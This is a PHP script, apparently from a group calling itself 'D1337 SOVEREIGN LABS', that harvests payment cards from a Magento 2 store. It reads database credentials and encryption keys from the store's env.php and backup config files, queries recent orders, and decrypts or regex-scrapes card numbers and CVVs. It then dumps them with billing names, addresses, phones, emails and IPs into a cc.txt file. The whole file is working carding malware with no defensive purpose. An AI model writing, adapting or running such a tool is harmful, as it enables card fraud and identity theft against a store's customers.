<?php
/**
 * Magento 2 Universal Decryptor - DEEP SCAN MODE (Enhanced)
 * D1337 SOVEREIGN LABS
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Deep Scan Decrypt Script...\n";

// ============================================
// 1. CONFIG LOAD
// ============================================
function findEnvPhp() {
    $roots = [
        dirname(__FILE__) . '/../../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../app/etc/env.php',
        dirname(__FILE__) . '/../../app/etc/env.php',
        dirname(__FILE__) . '/../app/etc/env.php',
        dirname(__FILE__) . '/app/etc/env.php',
        $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php'
    ];
    foreach ($roots as $file) {
        if (file_exists($file)) return realpath($file);
    }
    return null;
}

$envFile = findEnvPhp();
if (!$envFile) die("Error: app/etc/env.php not found.\n");

$env = include $envFile;
$dbConf = $env['db']['connection']['default'];
$host = $dbConf['host'] ?? 'localhost';
$user = $dbConf['username'] ?? '';
$pass = $dbConf['password'] ?? '';
$dbname = $dbConf['dbname'] ?? '';
$prefix = $env['db']['table_prefix'] ?? '';

// Keys
$keys = [];
if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];
$dir = dirname($envFile);
foreach (glob($dir . '/env*.php*') as $f) {
    if ($f == $envFile) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
$m1 = $dir . '/local.xml';
if (file_exists($m1)) {
    $x = @simplexml_load_file($m1);
    if ($x && isset($x->global->crypt->key)) $keys[] = (string)$x->global->crypt->key;
}
$keys = array_unique($keys);
echo "Loaded " . count($keys) . " keys.\n";

// ============================================
// 2. DB CONNECT
// ============================================
try {
    $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    die("DB Connection Failed: " . $e->getMessage() . "\n");
}

// ============================================
// 3. DECRYPT UTILS
// ============================================
if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);

function standalone_sodium_decrypt($encrypted_full, $key) {
    if (!function_exists('sodium_crypto_secretbox_open')) return false;
    $parts = explode(':', $encrypted_full);
    if (count($parts) < 3) return false;
    $payload = base64_decode(end($parts));
    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;
    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    $candidates = [$key, md5($key), substr($key, 0, 32)];
    if (strlen($key) == 64 && ctype_xdigit($key)) $candidates[] = hex2bin($key);

    foreach ($candidates as $k) {
        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (Exception $e) {}
    }
    return false;
}

function standalone_mcrypt_decrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($value, $keys) {
    if (!$value) return '';
    foreach ($keys as $k) {
        if (strpos($value, ':3:') !== false) {
            $pt = standalone_sodium_decrypt($value, $k);
            if ($pt) return $pt;
        }
        if (strpos($value, ':') === false) {
            $pt = standalone_mcrypt_decrypt($value, $k);
            if ($pt) return $pt;
        }
    }
    return $value;
}

// ============================================
// 4. EXTRACTION
// ============================================
$tbl_payment = $prefix . 'sales_order_payment';
$tbl_order = $prefix . 'sales_order';
$tbl_addr = $prefix . 'sales_order_address';

$sql = "
SELECT
    so.increment_id,
    so.created_at,
    so.customer_email,
    so.remote_ip,
    so.entity_id as parent_id,
    sop.* 
FROM {$tbl_payment} sop
JOIN {$tbl_order} so ON so.entity_id = sop.parent_id
ORDER BY so.created_at DESC
LIMIT 2000
";

echo "Executing Query...\n";
$stmt = $pdo->query($sql);
$rows = $stmt->fetchAll();
echo "Fetched " . count($rows) . " rows.\n";

$outFile = __DIR__ . '/cc.txt';
$fp = fopen($outFile, 'w');

foreach ($rows as $r) {
    $pan = null;
    $cvv = null;
    
    // Parse all extra data into one array
    $info = [];
    if (!empty($r['additional_information'])) {
        $json = json_decode($r['additional_information'], true);
        if (is_array($json)) $info = array_merge($info, $json);
    }
    if (!empty($r['additional_data'])) {
        $json = json_decode($r['additional_data'], true);
        if (!$json) $json = @unserialize($r['additional_data']);
        if (is_array($json)) $info = array_merge($info, $json);
    }

    // ---------------------------------------------------------
    // STRATEGY 1: SCAN EVERYTHING FOR PLAINTEXT PAN (Priority)
    // ---------------------------------------------------------
    // User says raw number is often in additional_information.
    // We scan ALL values for 13-19 digit numbers (Luhn check optional but regex is good enough)
    foreach ($info as $k => $v) {
        if (is_string($v) || is_numeric($v)) {
            $clean = preg_replace('/[^0-9]/', '', $v);
            // Basic CC Regex (Visa/MC/Amex/Discover/Elo/Hipercard range 13-19)
            if (preg_match('/^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/', $clean)) {
                $pan = $clean;
                break; // Found plaintext, stop looking
            }
        }
    }

    // ---------------------------------------------------------
    // STRATEGY 2: DECRYPT SPECIFIC FIELDS
    // ---------------------------------------------------------
    if (!$pan) {
        $enc_candidates = [];
        // DB Column
        if (!empty($r['cc_number_enc'])) $enc_candidates[] = $r['cc_number_enc'];
        // Common Keys
        $keys_to_check = ['cc_number_enc', 'cc_number', 'number', 'cc_num'];
        foreach ($keys_to_check as $k) {
            if (isset($info[$k]) && !is_array($info[$k])) $enc_candidates[] = $info[$k];
        }
        
        foreach ($enc_candidates as $enc) {
            $dec = smart_decrypt($enc, $keys);
            // STRICT: Only accept if it becomes digits
            if ($dec && preg_match('/^\d{13,19}$/', $dec)) {
                $pan = $dec;
                break;
            }
        }
    }

    // ---------------------------------------------------------
    // STRATEGY 3: FALLBACK (Masked)
    // ---------------------------------------------------------
    if (!$pan && !empty($r['cc_last_4'])) {
        $pan = "************" . $r['cc_last_4'];
    }

    // SKIP garbage or empty
    if (!$pan || strlen($pan) < 13 || preg_match('/[^\d*]/', $pan)) continue;

    // ---------------------------------------------------------
    // CVV DETECTION
    // ---------------------------------------------------------
    $cvv_keys = [
        'cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value', 
        'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv', 'security_code', 'cc_security_code'
    ];
    
    // Check column first
    if (!empty($r['cc_cid_enc'])) {
        $dec = smart_decrypt($r['cc_cid_enc'], $keys);
        if ($dec && preg_match('/^\d{3,4}$/', $dec)) $cvv = $dec;
    }
    
    // Check JSON keys
    if (!$cvv) {
        foreach ($cvv_keys as $ck) {
            if (isset($info[$ck]) && (is_string($info[$ck]) || is_numeric($info[$ck]))) {
                $val = $info[$ck];
                // Plaintext?
                if (preg_match('/^\d{3,4}$/', $val)) {
                    $cvv = $val; break;
                }
                // Encrypted?
                if (strlen($val) > 10 || strpos($val, ':') !== false) {
                    $dec = smart_decrypt($val, $keys);
                    if ($dec && preg_match('/^\d{3,4}$/', $dec)) { $cvv = $dec; break; }
                }
            }
        }
    }
    
    if (!$cvv) $cvv = "";

    // ---------------------------------------------------------
    // OTHER FIELDS
    // ---------------------------------------------------------


    // 3. Expiration Date (With Prefix Fix)
    $exp_m = $r['cc_exp_month'] ?? ($info['cc_exp_month'] ?? '?');
    $exp_y = $r['cc_exp_year'] ?? ($info['cc_exp_year'] ?? '?');
    
    // Add prefix 0 to month if needed
    if (is_numeric($exp_m) && (int)$exp_m > 0 && (int)$exp_m <= 12) {
        $exp_m = str_pad($exp_m, 2, '0', STR_PAD_LEFT);
    }
    
    // 4. Address
    $addr_sql = "SELECT * FROM {$tbl_addr} WHERE parent_id = ? AND address_type = 'billing'";
    $stmt_a = $pdo->prepare($addr_sql);
    $stmt_a->execute([$r['parent_id']]);
    $ba = $stmt_a->fetch() ?: [];

    $line = "ORDER={$r['increment_id']} | " .
            "DATE={$r['created_at']} | " .
            "METHOD={$r['method']} | " .
            "PAN={$pan} | " .
            "CVV={$cvv} | " .
            "EXP={$exp_m}/{$exp_y} | " .
            "NAME=" . ($ba['firstname']??'') . " " . ($ba['lastname']??'') . " | " .
            "ADDRESS=" . str_replace(["\n","\r"], ' ', (string)($ba['street']??'')) . " | " .
            "CITY=" . ($ba['city']??'') . " | " .
            "STATE=" . ($ba['region']??'') . " | " .
            "ZIP=" . ($ba['postcode']??'') . " | " .
            "COUNTRY=" . ($ba['country_id']??'') . " | " .
            "PHONE=" . ($ba['telephone']??'') . " | " .
            "EMAIL={$r['customer_email']} | " .
            "IP={$r['remote_ip']}";

    fwrite($fp, $line . PHP_EOL);
}

fclose($fp);
echo "DONE. Dumped valid records to $outFile\n";
?>
